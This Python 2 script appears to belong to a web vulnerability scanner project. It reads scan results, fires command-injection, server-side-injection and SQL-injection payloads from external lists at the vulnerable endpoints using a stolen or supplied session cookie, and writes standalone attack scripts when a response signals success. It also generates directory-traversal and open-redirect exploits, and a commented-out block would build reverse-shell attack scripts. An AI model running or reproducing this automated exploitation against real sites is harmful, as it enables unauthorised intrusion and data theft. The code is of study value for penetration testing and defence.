import json
from scanner import make_request
from scanner import make_auth_request

cookie_data = open('cookie.txt', 'r').read().strip()
COOKIE_HTTP_HEADER = {'Cookie': cookie_data}

with open('./vulnScanScripts/commandInjExploitPayloads.txt') as f:
    commandExecExploitList = list(f)

with open('vulnScanScripts/commandInjExploitRevShellPayloads.txt') as f:
    commandExecExploitRevShellList = list(f)

with open('vulnScanScripts/serverSideExploitPayloads.txt') as f:
	serverInjectExploitList = list(f)

with open('vulnScanScripts/sqlExploitPayloads.txt') as f:
	sqlExploitList = list(f)

def exploitCommandInj(vulnJSON):
    results = vulnJSON['results']
    for hostname in results.keys():
        exploitDetails = results[hostname]
        for index, exploitDetail in enumerate(exploitDetails):
            method = exploitDetail['method']
            params = exploitDetail['params']
            url = hostname + exploitDetail['endpoint']
            for key in params.keys():
                for y in commandExecExploitList:
                    params[key] = y.replace("\n", "")
                    #response = make_request(method, url, method_params)
                    response = make_auth_request(method, url, params, COOKIE_HTTP_HEADER)
                    print "\n[*]Searching for the correct exploit..."
                    print "[*]Payload used: " + str(params)
                    print "[*]Elasped Time: " + str(response.elapsed.total_seconds())
                    print "[*]Response content length: " + str(response.headers['content-length'])
                    print "[*]Response content: \n" + response.content
                    if response.content.find("Linux") != -1: #Aim of logic is to execute uname -a.
                        print "[*]Exploit found! Generating standalone attack script..."

                        #Generate standalone exploit script to execute uname -a
                        with open('generatedExploits/command_injection'+str(params.keys())+str(index)+'.py', 'w') as exploitFile:
                            if method == "POST":
                                exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
                                exploitFile.write('response = requests.post("'+url+'",'+str(params)+')\n')
                                exploitFile.write("print response.content")

                            elif method == "GET":
                                exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
                                exploitFile.write('response = requests.get("'+url+'",'+str(params)+')\n')
                                exploitFile.write("print response.content")
                        break
    '''
    # Tries to generate a compatible reverse shell. Manual intervention if necessary. Edit the file 'commandInjExploitRevShellPayloads' if needed.
    for z in commandExecExploitRevShellList:
        for key, value in method_params.items():
            method_params[key] = z.replace("\n", "")
            count=+count+1
            print "[*]Exploit found! Generating standalone attack script (Command injection reverse shell)..."
            with open('command_injection_rev_shell'+str(method_params.keys())+str(count)+'.py', 'w') as exploitFile:
                    if method == "POST":
                        exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
                        exploitFile.write('response = requests.post("'+url+'",'+str(method_params).replace("\\'","'")+')\n')
                        exploitFile.write("print response.content")

                    elif method == "GET":
                        exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
                        exploitFile.write('response = requests.get("'+url+'",'+str(method_params)+')\n')
                        exploitFile.write("print response.content")'''

def exploitServerInj(vulnJSON):
    results = vulnJSON['results']
    for hostname in results.keys():
        exploitDetails = results[hostname]
        for index, exploitDetail in enumerate(exploitDetails):
            method = exploitDetail['method']
            params = exploitDetail['params']
            url = hostname + exploitDetail['endpoint']
            for key in params.keys():
                for y in serverInjectExploitList:
                    params[key] = y.replace("\n", "")
                    #response = make_request(method, url, method_params)
                    response = make_auth_request(method, url, params, COOKIE_HTTP_HEADER)
                    print "\n[*]Searching for the correct exploit..."
                    print "[*]Payload used: " + str(params)
                    print "[*]Elasped Time: " + str(response.elapsed.total_seconds())
                    print "[*]Response content length: " + str(response.headers['content-length'])
                    print "[*]Response content: \n" + response.content

                    if response.content.find("Linux") != -1: #Need to find a better logic, or change the value on the spot during assesment.
                        print "[*]Exploit found! Generating standalone attack script..."
                        with open('generatedExploits/server_side_injection'+str(params.keys())+str(index)+'.py', 'w') as exploitFile:
                            if method == "POST":
                                exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
                                exploitFile.write('response = requests.post("'+url+'",'+str(params)+')\n')
                                exploitFile.write("print response.content")
                            elif method == "GET":
                                exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
                                exploitFile.write('response = requests.get("'+url+'",'+str(params)+')\n')
                                exploitFile.write("print response.content")
                        break

def exploitSQLInj(vulnJSON):
    results = vulnJSON['results']
    for hostname in results.keys():
        exploitDetails = results[hostname]
        for index, exploitDetail in enumerate(exploitDetails):
            method = exploitDetail['method']
            params = exploitDetail['params']
            url = hostname + exploitDetail['endpoint']
            for x in sqlExploitList:
                for key in params.keys():
                        params[key] = x.replace("\n", "")
                        #response = make_request(method, url, method_params)
                        response = make_auth_request(method, url, params, COOKIE_HTTP_HEADER)
                        print "\n[*]Searching for the correct exploit..."
                        print "[*]Payload used: " + str(params)
                        print "[*]Elasped Time: " + str(response.elapsed.total_seconds())
                        print "[*]Response content length: " + str(response.headers['content-length'])
                        print "[*]Response content: \n" + response.content

                        if response.content.find("5.7.21-0ubuntu") != -1 or response.content.find("root") != -1: #Change detection logic of this when necessary
                            print "[*]Exploit found! Generating standalone attack script..."
                            with open('generatedExploits/sql_injection'+str(params.keys())+str(index)+'.py', 'w') as exploitFile:
                                if method == "POST":
                                    exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
                                    exploitFile.write('response = requests.post("'+url+'",'+str(params)+')\n')
                                    exploitFile.write("print response.content")
                                elif method == "GET":
                                    exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
                                    exploitFile.write('response = requests.get("'+url+'",'+str(params)+')\n')
                                    exploitFile.write("print response.content")
                            break

def exploitDirTrav(vulnJSON):
    results = vulnJSON['results']
    for hostname in results.keys():
        exploitDetails = results[hostname]
        for index, exploitDetail in enumerate(exploitDetails):
            method = exploitDetail['method']
            params = exploitDetail['params']
            url = hostname + exploitDetail['endpoint']
            with open('generatedExploits/dir_traversal'+str(params.keys())+str(index)+'.py', 'w') as exploitFile:
                if method == "POST":
                    exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
                    exploitFile.write('response = requests.post("'+url+'",'+str(params)+')\n')
                    exploitFile.write("print response.content")
                elif method == "GET":
                    exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
                    exploitFile.write('response = requests.get("'+url+'",'+str(params)+')\n')
                    exploitFile.write("print response.content")

def exploitOpenRed(vulnJSON):
    results = vulnJSON['results']
    for hostname in results.keys():
        exploitDetails = results[hostname]
        for index, exploitDetail in enumerate(exploitDetails):
            method_params = exploitDetail['params']
            first_param = method_params.keys()[0]
            target_url = method_params[first_param]
            url = hostname + exploitDetail['endpoint']
            with open('generatedExploits/open_redir'+str(method_params.keys())+str(index)+'.py', 'w') as exploitFile:
                exploitFile.write('from selenium import webdriver\nurl = "'+ url + '?' + first_param + '=' + target_url + '"\n')
                exploitFile.write('firefox = webdriver.Firefox()\n')
                exploitFile.write("firefox.get(url)\n")

if __name__ == '__main__':
    with open('logs/scan_results.json', 'r') as file:
        resultsJSON = json.loads(file.read())
        for key in resultsJSON.keys():
            if key == "Command Injection":
                exploitCommandInj(resultsJSON[key])
            elif key == "Server Side Code Injection":
                try:
                    exploitServerInj(resultsJSON[key])
                except:
                    ## server injection has a connection adapter error
                    print "error generating server side code injection"
            elif key == "SQL Injection":
                exploitSQLInj(resultsJSON[key])
            elif key == "Directory Traversal":
                exploitDirTrav(resultsJSON[key])
            elif key == "Open Redirect":
                exploitOpenRed(resultsJSON[key])
            else:
                print key
